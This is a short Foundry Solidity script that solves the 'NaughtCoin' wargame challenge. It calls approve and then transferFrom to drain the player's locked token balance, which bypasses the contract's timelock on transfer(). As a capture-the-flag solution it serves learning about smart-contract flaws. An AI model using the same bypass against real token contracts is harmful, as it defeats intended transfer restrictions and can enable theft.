// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/NaughtCoin.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();
        NaughtCoin victim = NaughtCoin(0xa7CA75C7C6F10EfcA94AB1f35a77B466eD4D4974);
        victim.approve(msg.sender, victim.balanceOf(msg.sender));
        victim.transferFrom(msg.sender, address(1), victim.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}